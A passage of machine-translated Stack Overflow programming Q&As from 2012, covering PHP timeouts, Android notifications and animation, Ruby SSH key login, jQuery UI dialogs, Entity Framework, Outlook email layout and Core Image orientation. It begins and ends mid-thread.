**问题**：服务器是否通常配置为在检测到这么长的脚本运行时间时调用犯规？请注意，这不是专用服务器，只是磨机共享资源的运行，因此我无法通过 execute() 调用等使用 wget 启动相同的服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:39:27.950

这可能归结为这个电话：

```
//if all goes well, increase time limit by a second
set_time_limit(1); 
```

这个评论是不正确的。这将使脚本在调用 set_time_limit 时开始运行。增加一点可能是值得的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:53:33.950

这取决于您如何运行 PHP。

您需要立即查看[`max_execution_time`](http://www.php.net/manual/en/info.configuration.php#ini.max-execution-time)，文档还指出

> 您的 Web 服务器可以有其他可能会中断 PHP 执行的超时配置。Apache 有一个 Timeout 指令，而 IIS 有一个 CGI 超时功能。两者都默认为 300 秒。有关特定详细信息，请参阅您的 Web 服务器文档。

如果您通过 fcgi 运行 PHP，您还需要在那里调整超时。

**编辑**

您是否考虑过询问您的共享托管服务提供商？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-19T22:22:07.823

上面的答案是正确的，但是一些服务器（例如 apache）有脚本，可以终止长时间运行的 php 脚本，而不管 apache 配置中设置的 execution_time。

我通过从 php 脚本中启动 php_cli 进程解决了类似的问题（发送电子邮件通讯数小时）。如果您的主机支持它，这是处理这类事情的一种非常可靠的方式。

另一种非常好的方法是将加载时间分散到多个页面上。这可以通过在脚本上设置[ignore_user_abort](http://php.net/manual/en/function.ignore-user-abort.php)并在获取单个块并退出后使用 curl 调用其自己的 URL 来完成。

对于这两种方法，您都需要一个类似的方法来限制单个进程的执行时间：即使 CLI 和 Apache 都应该支持永久运行的脚本，但我发现它们会在一段时间后停止。这两种方法都类似于接力赛：跑 100 米，然后将工作交给下一个工人跑，等等。

要查看我是如何处理时事通讯的，[代码在 github 上](https://github.com/creativedutchmen/email_newsletter_manager/blob/master/lib/class.emailbackgroundprocess.php)

# android - 使用 Receiver 或 Service 从后台运行弹出通知

> ID：12009705
> 
> 赞同：2
> 
> 时间：2012-08-17T16:35:32.973
> 
> 标签：android, notifications, popup, broadcastreceiver

我正在尝试在 SMS 通知中实现一个相当常见的问题。

我想在屏幕上创建一个通知（自定义视图/文本/等），但我想尽量*减少*对用户的干扰。我不想创建一个额外的步骤来拖动通知栏并单击它，这是大多数股票消息应用程序所做的。

我最初的实现是通过接收器调出一个 AlertDialog，它可以正常工作，但当然会从用户手中夺走控制权，这不是我最终想要的。

我的第二个实现是通过一个“不可见”的活动来调出一个 PopupWindow。但是，正如您可能知道的那样，启动任何 Activity 都会关注当前的 Activity，因此即使用户可以看到仍在后台的内容，它也会（至少）导致用户一键分心。

我的第三个实现是自定义 Toast ——这很好用，除了它不可点击并且它的生命周期没有得到很好的控制。

所以，知道我已经实现了什么，我想问一下是否有人知道或知道我们如何在顶部附近弹出一个弹出窗口而不会造成*任何*干扰。我知道有几个通知管理器能够做到这一点。

这是 Pops Notification 的示例。 [http://imageshack.us/photo/my-images/849/screenshot2012081618583.png/](http://imageshack.us/photo/my-images/849/screenshot2012081618583.png/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:42:51.823

为什么不使用常规通知？

您可以对其进行配置，使其可以使手机振动、发出声音，甚至更改 LED 颜色（如果支持）。

这是我一直用来提供通知的简单方法：

注意：为了使振动起作用，您必须在清单中添加：

```
<uses-permission android:name="android.permission.VIBRATE" > 
```

方法：

```
public static void sendNotification(Context caller, Class<?> activityToLaunch, String title, String msg, int numberOfEvents,boolean sound, boolean flashLed, boolean vibrate,int iconID) {
    NotificationManager notifier = (NotificationManager) caller.getSystemService(Context.NOTIFICATION_SERVICE);

    final Notification notify = new Notification(iconID, "", System.currentTimeMillis());

    notify.icon = iconID;
    notify.tickerText = title;
    notify.when = System.currentTimeMillis();
    notify.number = numberOfEvents;
    notify.flags |= Notification.FLAG_AUTO_CANCEL;
    if (sound) notify.defaults |= Notification.DEFAULT_SOUND;

    if (flashLed) {
    // add lights
        notify.flags |= Notification.FLAG_SHOW_LIGHTS;
        notify.ledARGB = Color.CYAN;
        notify.ledOnMS = 500;
        notify.ledOffMS = 500;
    }

    if (vibrate) {
        notify.vibrate = new long[] {100, 200, 300};
    }

    Intent toLaunch = new Intent(caller, activityToLaunch);
    toLaunch.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
    toLaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    PendingIntent intentBack = PendingIntent.getActivity(caller, number, toLaunch, 0);

    notify.setLatestEventInfo(caller, title, msg, intentBack);   
    notifier.notify(number, notify);
    number = number+1;
} 
```

# ruby-on-rails - ruby on rails ssh连接而不提供密码

> ID：12009708
> 
> 赞同：1
> 
> 时间：2012-08-17T16:35:52.273
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ssh

目前我正在我的代码中进行 ssh 连接，如下所示：

```
Net::SSH.start( @HOST, @USER, :password => @PASS ) do|ssh|
   @result = ssh.exec!("ls")
   end 
```

现在我需要在不提供任何密码的情况下进行 SSH 连接。在不提供任何密码的情况下，我无法找到启动 ssh 连接的确切格式。

我已经在主机的授权密钥列表中添加了 SSH 密钥。我记得当我在没有密码的情况下浏览 ssh 时，在网上某处看到以下代码。

```
Net::SSH.start( @HOST, @USER) do|ssh|
       @result = ssh.exec!("ls")
       end 
```

如果我错了，请纠正我

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T21:00:52.090

您必须指向您的私钥，而不是公钥：

```
@USER = "me" 
@KEYS = ["my private key here"] 
@HOST = hostname  
Net::SSH.start( @HOST, @USER, :key_data=>@KEYS, :keys_only=>TRUE ) do|ssh|
  @result = ssh.exec!("ls")                 
end 
```

现在它不再需要密码了。

# ms-access - 隐藏字段列表边栏

> ID：12009711
> 
> 赞同：0
> 
> 时间：2012-08-17T16:35:57.290
> 
> 标签：ms-access, vba, ms-access-2010

我有一个创建表单的过程，然后在子表单控件中使用它。

我通过`docmd.echo`但侧边栏字段列表显示并后退来抑制视觉创建。

有没有办法抑制字段列表侧边栏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:51:21.610

这将在您重新打开数据库时适用。MS Accesss 2010 有六种用户可以使用的方法。这些可以从“选项”菜单中手动更改。

```
Sub SetStartUp()
    SetProp "StartupShowDBWindow", True, dbBoolean
    SetProp "AllowFullMenus", True, dbBoolean
End Sub

Sub SetProp(PropName As String, PropVal As Variant, Optional PropType = dbText)
Dim db As Object
Dim prp As Object
Dim strTitle As String

Const PROPERTY_NOT_FOUND As Integer = 3270

On Error GoTo ErrorHandler

   Set db = CurrentDb

   ' Try to set the property. If it fails, the property does not exist.
   db.Properties(PropName) = PropVal

ExitLine:
   db.Close
   Set db = Nothing
   Set prp = Nothing
   Exit Sub

ErrorHandler:
   If Err.Number = PROPERTY_NOT_FOUND Then
      ' Create the new property.
      Set prp = db.CreateProperty(PropName, PropType, PropVal)
      db.Properties.Append prp
      Resume Next
   Else
      Resume ExitLine
   End If

End Sub 
```

# jquery-ui - 单击jQueryUI对话框中的关闭按钮时重定向到另一个页面？

> ID：12009712
> 
> 赞同：0
> 
> 时间：2012-08-17T16:36:01.787
> 
> 标签：jquery-ui, jquery-ui-dialog

我想要做的是，当您单击 jQueryUI 对话框中的关闭按钮时，对话框将关闭，整个页面将被重定向到其他地方。如何做到这一点？看来我应该用一些额外的逻辑绑定关闭事件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:40:02.740

使用绑定在事件上的事件处理程序`close`：

```
$("#mydialog").dialog({
    close: function () {
        window.location = "http://www.google.com";
    }
}); 
```

（这假设您在某处定义了一个已关闭对话框的按钮）

**示例：http:** [//jsfiddle.net/hR2vN/](http://jsfiddle.net/hR2vN/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:42:58.063

```
$('#popup').bind('dialogclose', function(event) {
     window.location = "http://www.mydomain.com";
 }); 
```

# c# - 为什么没有捕获工作流异常？

> ID：12009713
> 
> 赞同：1
> 
> 时间：2012-08-17T16:36:09.823
> 
> 标签：c#, multithreading, exception-handling, workflow-foundation

下面是我的UI线程已经成功启动的新创建的线程代码（UI代码不在此处）。

当我单步调试时，我确实得到了这段代码。

当我正在执行的工作流没有任何问题时，代码会运行完成。但是，当工作流出现故障时（我正在使用有故障的工作流测试我的代码），此代码不会捕获在下面的语句中`WorkflowException`发生的情况。`wf.Run()`

我想我有下面的工作流执行异常处理代码？？你能告诉我我做错了什么吗？谢谢。

```
public void ThreadRun ()
    {  
            AutoResetEvent syncEvent = new AutoResetEvent(false);
            var wf = ActivityXamlServices.Load(fileInfo.FileName);
            // Create the WorkflowApplication using the desired
            // workflow definition.
            WorkflowApplication wfApp = new WorkflowApplication(wf);

            // Handle the desired lifecycle events.
            wfApp.Completed = delegate(WorkflowApplicationCompletedEventArgs e)
            {
                syncEvent.Set();
            };

            try
            {
                // Start the workflow.
                wfApp.Run();
                // Wait for Completed to arrive and signal that
                // the workflow is complete.
                syncEvent.WaitOne();
            }
            catch (Exception exception)
            {

                wfApp.Completed = delegate(WorkflowApplicationCompletedEventArgs e)
                {
                    if (e.CompletionState == ActivityInstanceState.Faulted)
                    {
                        Console.WriteLine("Workflow {0} Terminated.", e.InstanceId);
                        Console.WriteLine("Exception: {0}\n{1}",
                            e.TerminationException.GetType().FullName,
                            e.TerminationException.Message);
                    }
                    else if (e.CompletionState == ActivityInstanceState.Canceled)
                    {
                        Console.WriteLine("Workflow {0} Canceled.", e.InstanceId);
                    }
                    else
                    {
                        Console.WriteLine("Workflow {0} Completed.", e.InstanceId);

                        // Outputs can be retrieved from the Outputs dictionary,
                        // keyed by argument name.
                        // Console.WriteLine("The winner is {0}.", e.Outputs["Winner"]);
                    }
                };

                wfApp.Aborted = delegate(WorkflowApplicationAbortedEventArgs e)
                {
                    // Display the exception that caused the workflow
                    // to abort.
                    Console.WriteLine("Workflow {0} Aborted.", e.InstanceId);
                    Console.WriteLine("Exception: {0}\n{1}",
                        e.Reason.GetType().FullName,
                        e.Reason.Message);
                };

                wfApp.Idle = delegate(WorkflowApplicationIdleEventArgs e)
                {
                    // Perform any processing that should occur
                    // when a workflow goes idle. If the workflow can persist,
                    // both Idle and PersistableIdle are called in that order.
                    Console.WriteLine("Workflow {0} Idle.", e.InstanceId);
                };

                wfApp.PersistableIdle = delegate(WorkflowApplicationIdleEventArgs e)
                {
                    // Instruct the runtime to persist and unload the workflow.
                    // Choices are None, Persist, and Unload.
                    return PersistableIdleAction.Unload;
                };

                wfApp.Unloaded = delegate(WorkflowApplicationEventArgs e)
                {
                    Console.WriteLine("Workflow {0} Unloaded.", e.InstanceId);
                };

                wfApp.OnUnhandledException = delegate(WorkflowApplicationUnhandledExceptionEventArgs e)
                {
                    // Display the unhandled exception.
                    Console.WriteLine("OnUnhandledException in Workflow {0}\n{1}",
                        e.InstanceId, e.UnhandledException.Message);

                    Console.WriteLine("ExceptionSource: {0} - {1}",
                        e.ExceptionSource.DisplayName, e.ExceptionSourceInstanceId);

                    // Instruct the runtime to terminate the workflow.
                    // Other choices are Abort and Cancel. Terminate
                    // is the default if no OnUnhandledException handler
                    // is present.
                    return UnhandledExceptionAction.Terminate;
                };
            }
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:58:39.550

我认为那是因为异常是在不同的线程中引发的。检查这个：[捕获在不同线程中抛出的异常](https://stackoverflow.com/questions/5983779/catch-exception-that-is-thrown-in-different-thread)

默认情况下，不同线程中抛出的异常不会传递给调用者线程。

编辑：我的印象是您希望在工作流程开始之前设置代表，对吗？如果是这样，`wfApp.OnUnhandledException`请*在*执行`wfApp.Run()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-12T18:29:39.293

我认为你只需要在 catch 之前处理 OnUnhandledException 事件（我看到你已经处理了这个事件，但是在你的 catch 块中）。

wfApp.OnUnhandledException 会让你捕捉到错误。

# json - 数组上的@JsonIdentityInfo

> ID：12009716
> 
> 赞同：0
> 
> 时间：2012-08-17T16:36:23.897
> 
> 标签：json, jackson, deserialization

我最近刚刚升级到 Jackson 2.0.5 并发现了这个名为 @JsonIdentityInfo 的新属性，它允许您定义一个对象一次，然后让序列化程序创建对该单个对象的引用，而无需在每次看到它时都创建重复项。其实很不错。[http://wiki.fasterxml.com/JacksonFeatureObjectIdentity](http://wiki.fasterxml.com/JacksonFeatureObjectIdentity)

该文档指出，此功能目前尚不支持数组。我想知道是否有人知道任何其他方法？我有一段可能如下所示的 JSON 片段：

```
{
    "people":[ 
       { "@id" = 1, "name"="bill"},
       { "@id" = 2, "name"="joe"}
    ],
    "friends": [1,2]

} 
```

我想让“朋友”与“人”对象的数组一起膨胀，就像“人”一样。有谁知道这样做的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-01T16:37:29.633

您可以使用 JSOG JS 库来做到这一点：[https](https://github.com/jsog/jsog) ://github.com/jsog/jsog ，但您需要序列化数据，例如：

```
{
"people":[ 
   { "@id" = 1, "name"="bill"},
   { "@id" = 2, "name"="joe"}
],
"friends": [ {@ref = 1}, {@ref = 2}] 
```

}

或修改 JSOG 库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T17:17:48.337

您可以做的是使用仅包含数组或列表的包装 POJO。该 POJO 可以正常使用身份处理。它增加了一个额外的级别，但应该可以很好地工作。

如果您希望看到对列表/数组类型的支持，请确保在[Github](https://github.com/FasterXML/jackson-databind)提交 RFE 。虽然实现起来并不简单，但它是可能的，只是相当多的工作（这就是为什么最初的实现专注于以 JSON 对象表示的事物的原因）。

# jquery - 使用 JQuery 粘性/跟随侧边栏但框标题图像不随文本移动？

> ID：12009717
> 
> 赞同：0
> 
> 时间：2012-08-17T16:36:25.223
> 
> 标签：jquery, html, css, sidebar, sticky

提前，谢谢。

我一直在使用来自[HERE](http://andrewhenderson.me/tutorial/jquery-sticky-content)的粘性侧边栏代码，我正在通过向框中添加图像标题来自定义样式，但是当它到位时，它不会跟随您可以在此处自己看到的文本：[thomas-dixon.com/joomla](http://thomas-dixon.com/joomla)。

这是我正在使用的代码：

```
[view-source:http://thomas-dixon.com/joomla/][3] 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:44:14.770

**演示**：http: [//jsfiddle.net/enve/hjeBP/](http://jsfiddle.net/enve/hjeBP/)

用这个替换你的**jQuery**代码：

```
<script type="text/javascript">
$(function(){ // document ready

  if (!!$('#sidebar-left-content').length) { // make sure "#sidebar-left-content" element exists

  var el = $('#sidebar-left-wrap');
  var stickyTop = $('#sidebar-left-content').offset().top; // returns number
  var footerTop = $('#footer').offset().top; // returns number
  var stickyHeight = $('#sidebar-left-content').height();
  var limit = footerTop - stickyHeight - 20;

  $(window).scroll(function(){ // scroll event

                   var windowTop = $(window).scrollTop(); // returns number

                   if (stickyTop < windowTop){
                   el.css({ position: 'fixed', top: 0 });
                   }
                   else {
                   el.css('position','static');
                   }

                   if (limit < windowTop) {
                   var diff = limit - windowTop;
                   el.css({top: diff});
                   }

                   });

  }
  });</script> 
```

工作演示：http: [//jsfiddle.net/enve/hjeBP/](http://jsfiddle.net/enve/hjeBP/)

# c# - 过滤然后重新分配导航属性

> ID：12009720
> 
> 赞同：0
> 
> 时间：2012-08-17T16:36:34.877
> 
> 标签：c#, asp.net, entity-framework, ado.net

我正在写一个处理列表过滤的网站。用户选择一些选项，数据在服务器端过滤并通过 AJAX 请求返回给用户。

对于这个例子，假设我有一个汽车制造商表（福特、宝马、菲亚特等），它有一个指向所有车辆列表的外键，而该列表又具有一个指向车辆类型表的外键。

所以它会是这样的：

**制造商**

*   制造商ID
*   姓名

**类型**

*   类型ID
*   姓名

**车辆**

*   车辆ID
*   制造商ID
*   类型ID
*   姓名

这将作为一个不错的实体和一些方便的导航属性返回。但是，这是我面临的问题：假设我想根据类型过滤制造商的车辆，内联。

```
foreach (var manufacturer in manufacturers)
{
    manufacturer.Vehicles = manufacturer.Vehicles.Any(v => v.Type.Name == "Car"));
} 
```

这看起来很简单，但我得到了错误：

> 无法将类型“System.Collections.Generic.IEnumerable”隐式转换为“System.Data.Objects.DataClasses.EntityCollection”。存在显式转换（您是否缺少演员表？）

转换为 EntityCollection 没有帮助，并在运行时引发异常。甚至可以将 Linq 查询的结果分配给导航属性吗？还有另一种方法吗？我正在使用 ViewModel，但如果可以的话，我想重新使用导航属性，而不是在字典中编写并手动处理所有内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:50:38.100

问题是**manufacturer.Vehicles**的类型是**EntityCollection**和**manufacturer.Vehicles.Any**返回一个**IEnumerable**类型的对象，所以你想尝试如下：

```
foreach ( manufacturer in manufacturers) {
   manufacturer.Vehicles = (from vehicle in manufacturer.Vehicleswhere vehicle.Type.Name == "Car");
} 
```

# php - 为什么 Mac 上的 Firefox 下载文件但无法正确识别？

> ID：12009723
> 
> 赞同：0
> 
> 时间：2012-08-17T16:36:53.220
> 
> 标签：php, macos, firefox

我在 PHP 中提供文件。在 Windows、IE、Safari 和 Firefox 中成功下载文件。在 Mac 上，Safari 可以正常下载。但是 Mac 上的 Firefox 不知道如何处理该文件，并要求保存 PHP 文件或尝试打开 PHP 文件。如果我保存 PHP 文件并将其正确重命名为实际文件 (PDF)，则它可以正常打开。为什么 Mac Firefox 版本无法正确重命名文件并识别其内容类型？我的代码如下：

```
$content = file_get_contents('/tmp/file.pdf');

header("Pragma: public");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");

//hack to allow PDF file downloads over HTTPS for Internet Explorer 8
if(strstr($_SERVER["HTTP_USER_AGENT"],"MSIE")==false) {
  header("X-Download-Options: noopen "); 
  header("X-Content-Type-Options: nosniff"); 
}

header("Content-type:application/pdf");
echo $content; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:07:21.470

我能够通过添加来解决它：

```
header("Content-disposition: inline; filename=file.pdf"); 
```

# android - Android 动画无法启动

> ID：12009727
> 
> 赞同：0
> 
> 时间：2012-08-17T16:37:18.617
> 
> 标签：android

我知道这是非常简单的事情，但我没有看到问题所在。

我有一个线性布局：

```
LinearLayout menuSlide = (LinearLayout) findViewById(R.id.menuSlide);
menuSlide.startAnimation(new ExpandAnimation(menuSlide, 0, (int) (screenWidth*0.7), 20)); 
```

和 ExpandAnimation 类：

```
public class ExpandAnimation extends Animation implements Animation.AnimationListener{

    private View view;
    private static int ANIMATION_DURATION;
    private static final String LOG_CAT = "ExpandAnimation";
    private int lastWidth;
    private int fromWidth;
    private int toWidth;
    private static int STEP_SIZE=30;

    public ExpandAnimation(View v,int fromWidth, int toWidth, int duration){
        Log.v(LOG_CAT, "Entramos en el constructor del ExpandAnimation");
        this.view = v;
        ANIMATION_DURATION = 1;
        this.fromWidth = fromWidth;
        this.toWidth = toWidth;

        setDuration(ANIMATION_DURATION);
        setRepeatCount(20);
        setFillAfter(false);
        setInterpolator(new AccelerateInterpolator());
        setAnimationListener(this);
        startNow();
    }

    @Override
    public void onAnimationEnd(Animation animation) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onAnimationRepeat(Animation animation) {
        // TODO Auto-generated method stub
        Log.v(LOG_CAT, "Entra en el onAnimationRepeat");
        LayoutParams lyp = view.getLayoutParams();
        lyp.width = lastWidth += toWidth/20;
        view.setLayoutParams(lyp);

        Log.v(LOG_CAT,"El objeto: " + view.getId() + " tiene ahora de ancho: " + view.getWidth());
    }

    @Override
    public void onAnimationStart(Animation animation) {
        // TODO Auto-generated method stub
        Log.v(LOG_CAT, "Entra en el onAnimationStart");
        LayoutParams lyp = view.getLayoutParams();
        lyp.width = 0;
        view.setLayoutParams(lyp);
        lastWidth=0;
    }

} 
```

好的，程序到达 ExpandAnimation 的构造函数，但没有别的，onAnimationStart 永远不会被触发。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:44:59.957

我没有运行你的代码，但是在

```
public ExpandAnimation(View v,int fromWidth, int toWidth, int duration){
        Log.v(LOG_CAT, "Entramos en el constructor del ExpandAnimation");
      1\.  this.view = v;
      2\.   ANIMATION_DURATION = 1;
      3\. this.fromWidth = fromWidth;
      4\.  this.toWidth = toWidth;

        setDuration(ANIMATION_DURATION);
        setRepeatCount(20);
        setFillAfter(false);
        setInterpolator(new AccelerateInterpolator());
        setAnimationListener(this);
        startNow();
    } 
```

*您没有将持续时间设置为变量值，*您也可以执行类似`ANIMATION_DURATION = duration;`的操作**改变**

 ***```
view = v;
ANIMATION_DURATION = duration;
fromWidth = this.fromWidth;
toWidth = this.toWidth; 
```

编辑：通过代码制作动画很困难，更简单的方法是通过 XML 文件，首先在 res 文件夹下创建一个文件夹名称 anim 然后创建一个名为 scale.xml 的 xml 文件并执行以下操作...

```
<set xmlns:android="http://schemas.android.com/apk/res/android"
      android:interpolator="@android:anim/accelerate_interpolator">
   <scale
      android:fromXScale="1"
      android:toXScale="1"
      android:fromYScale="0.1"
      android:toYScale="1.0"
      android:duration="500"
      android:pivotX="50%"
      android:pivotY="50%"
      android:startOffset="100" />
</set> 
```

然后在您的活动中只需调用

```
Animation a = AnimationUtils.loadAnimation(this, R.anim.scale);
((LinearLayout) findViewById(R.id.yourlayoutID)).startAnimation(a); 
```***

# iphone - 不需要的失真：核心图像过滤器正在旋转我的图像

> ID：12009729
> 
> 赞同：1
> 
> 时间：2012-08-17T16:37:29.030
> 
> 标签：iphone, ios, xcode, image-processing, core-image

当我在某些图像上运行核心图像过滤器（如 CIHueAdjust）时，它们会意外旋转 90 度 - 逆时针。这种失真似乎只发生在使用 iOS 设备纵向拍摄的图像上。

这是一个简单的 xcode 项目，具有图像导入和 CIHueAdjust 过滤器： [owolf.net/uploads/StackOverflow/HueAdjustProject2.zip](http://owolf.net/uploads/StackOverflow/HueAdjustProject2.zip)

如果我在使用 iPhone 拍摄的纵向图像上运行过滤器（[如此处链接](http://owolf.net/uploads/StackOverflow/JayFai.JPG)的这个），结果就像下面的屏幕截图。

这个有办法解决吗？？谢谢阅读。

![在此处输入图像描述](../Images/30cc3e37e9c1a101fdf5afb1e1b11a39.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:36:02.583

图像具有不同的方向。应用过滤器后，您将失去方向。您应该使用简单的仿射变换来补偿方向。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-18T07:09:04.807

```
if ([image imageOrientation] == 3) {
    imageView.transform = CGAffineTransformMakeRotation(M_PI / 2.0);
} else if ([image imageOrientation] == 2) {
    imageView.transform = CGAffineTransformMakeRotation((M_PI / 2.0)*-1);
}  else if ([image imageOrientation] == 1) {
    imageView.transform = CGAffineTransformMakeRotation(M_PI);    
}else {
    //no rotation necessary    
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-24T09:38:12.690

您可以使用具有 3 个参数（CIImage、比例、方向 = 右）的函数 UIIMage.FromImage 将图像旋转回原始方向。这是代码片段：

```
var rotatedCIImage = imageEffectFunc (src); //rotatedCIImage = your CIImage after taken effect that has been rotated 90° counter clockwise.

if (rotatedCIImage != null) {
   UIImage result = UIImage.FromImage(rotatedCIImage,1.0f,UIImageOrientation.Right);
   return result;
} else {
   return null;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-04-09T12:22:38.380

我遇到了同样不受欢迎的轮换问题。

我通过记住被过滤的 UIImage 的高度是否大于应用过滤器之前的宽度来解决它。

应用过滤器后，我再次检查 UIImage 高度是否仍大于宽度。如果不是我将 UIImage 旋转了 90 度。

在确定滤镜已旋转图像后，我在这里使用了扩展来旋转 UIImage。: [在 Swift 中旋转 UIImage](https://stackoverflow.com/questions/27092354/rotating-uiimage-in-swift)

我在应用过滤器之前和应用过滤器之后都使用这个示例来获取 UIImage 的高度和宽度： [iphone - 我如何获取 uiimage 的高度和宽度](https://stackoverflow.com/questions/5249664/iphone-how-can-i-get-the-height-and-width-of-uiimage)

我进行更正的代码如下所示：

```
if heightIsLargerThanWidth && slideShowImageView_2.image!.size.height < slideShowImageView_2.image!.size.width
{
    self.slideShowImageView_2.image = self.slideShowImageView_2.image?.rotate(radians: .pi/2)
} 
```

注意 heightIsLargerThanWidth 包含一个布尔值，指示应用过滤器之前的状态。

# html - 在 Outlook 2010 中删除表格单元格间距

> ID：12009730
> 
> 赞同：2
> 
> 时间：2012-08-17T16:37:31.567
> 
> 标签：html, css, html-email, outlook-2010

希望在 HTML 电子邮件中使用模拟项目符号列表中的表格。下面的代码适用于除 Outlook 2010 和 2013 之外的所有客户端。

我们使用 line-height 和其他 CSS 来删除所有单元格间距。但是，在 Outlook 2010 中，行高声明将被忽略，并显示默认（增加的）间距。

有谁知道是否有任何 CSS 解决方案可以让 Outlook 尊重行高？

```
<table style="border-collapse:collapse; padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; font-size: 13px; padding-top: 0px;" border="0" cellspacing="0" cellpadding="0" width="100%">
                        <tbody>
                            <tr>
                                <td align="right" valign="top" style="padding-left: 18px; margin: 0px; width: 16px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; padding-bottom: 0px;"><span style="font-size:16px; line-height: 18px;">&bull;</span></td>
                                <td style="padding-left: 14px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; color: #400400; padding-bottom: 0px; margin: 0px; line-height: 18px;">A</td>
                          </tr>
                            <tr>
                                <td align="right" valign="top" style="padding-left: 18px; margin: 0px; width: 16px; font-family: 'trebuchet ms', arial, helvetica, sans-serif;"><span style="font-size:16px; line-height: 18px;">&bull;</span></td>
                                <td style="padding-left: 14px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; color: #400400; margin: 0px; line-height: 18px;">B</td>
                          </tr>
                            <tr>
                                <td align="right" valign="top" style="padding-left: 18px; width: 16px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; margin: 0px;"><span style="font-size:16px; line-height: 18px;">&bull;</span></td>
                                <td style="padding-left: 14px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; color: #400400; margin: 0px; line-height: 18px;">C</td>
                            </tr>
                        </tbody>
                    </table> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T14:30:13.370

**解决方案**

一般来说，这不是自定义列表中项目符号大小的合理方法，因为在 Outlook 2007 及更高版本中存在副作用（如下所述）。但是，在这种特殊情况下，使用 Arial 而不是 Trebuchet MS 作为项目符号字符可能是一个合适的解决方案。

```
<table style="font-family: 'trebuchet ms', arial, helvetica, sans-serif; font-size: 13px;" border="0" cellspacing="0" cellpadding="0" width="100%">
    <tbody>
        <tr>
            <td width="16" height="18" align="right" valign="top" style="padding-left: 18px; font-family: arial, helvetica, sans-serif; background-color: #77ddaa;"><span style="font-size:16px; line-height: 18px;">&bull;</span></td>
            <td style="padding-left: 14px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; color: #400400; font-size:13px; line-height: 18px; background-color: #77aadd;">A</td>
        </tr>
        <tr>
            <td width="16" height="18" align="right" valign="top" style="padding-left: 18px; font-family: arial, helvetica, sans-serif; background-color: #77ddaa;"><span style="font-size:16px; line-height: 18px;">&bull;</span></td>
            <td style="padding-left: 14px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; color: #400400; font-size:13px; line-height: 18px; background-color: #77aadd;">B</td>
        </tr>
        <tr>
            <td width="16" height="18" align="right" valign="top" style="padding-left: 18px; font-family: arial, helvetica, sans-serif; margin: 0px; background-color: #77ddaa;"><span style="font-size:16px; line-height: 18px;">&bull;</span></td>
            <td style="padding-left: 14px; font-family: 'trebuchet ms', arial, helvetica, sans-serif; color: #400400; font-size:13px; line-height: 18px; background-color: #77aadd;">C</td>
        </tr>
    </tbody>
</table> 
```

**解释**

使用`font-size:16px`项目符号字符会强制 Outlook 2007 及更高版本以至少 22px 的高度呈现每一行，无论指定`line-height`的是什么。当我`font-size`将子弹的大小减小到 13 像素时，线条的高度为 18 像素。如果`font-size`增加到 20px，则渲染的行高为 26px。

这似乎是 Outlook 2007 及更高版本需要多少高度才能以这些字体大小呈现全部可能的文本字符（即使项目符号字符本身不使用大部分可用高度）。数字因使用的字体系列而异。

*宋体*

```
font-size    minimum line-height     difference
   10               13                  +3
   11               14                  +3
   12               15                  +3
   16               18                  +2
   20               23                  +3
   30               35                  +5
   60               67                  +7 
```

*投石机 MS*

```
font-size    minimum line-height    difference
   10               15                  +5
   11               16                  +5
   12               18                  +6
   16               22                  +6
   20               26                  +6
   30               38                  +8
   60               76                  +16 
```

**相关信息**

对于 HTML 表格，使用 HTML 属性而不是 CSS 样式指定宽度和高度。Outlook 的现代版本忽略`width`和`height`样式。

在某些情况下，向表格单元格添加`line-height`样式（可能还有 HTML`height`属性）将有助于强制实现所需的行高。

[Outlook 不支持的部分功能列表](https://stackoverflow.com/a/12019156/1306809)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-19T02:22:54.860

您无法`line-height`在 Outlook 中工作。但是，您可以做的是在各个列中打破表格，这意味着不需要`&bull;`在`span`. 而不是创建一个`td`将持有的`&bull;`。您可以在那里使用 table 属性`v-align:top/middle/bottom;`来正确排列列表项。这样就不需要使用`line-height`属性。

# iphone - 隐藏标签栏时如何显示工具栏？

> ID：12009731
> 
> 赞同：0
> 
> 时间：2012-08-17T16:37:38.777
> 
> 标签：iphone, ios, uitabbarcontroller, toolbar, tabbar

目前我正在使用简单的 iphone 应用程序，使用标签栏设置五个按钮，然后我在标签栏隐藏时选择第三个标签，然后我在标签栏区域显示工具栏功能，但未显示工具栏，是否可以显示工具栏tabbar什么时候隐藏的时候？请帮我

提前致谢

我试过这个：

```
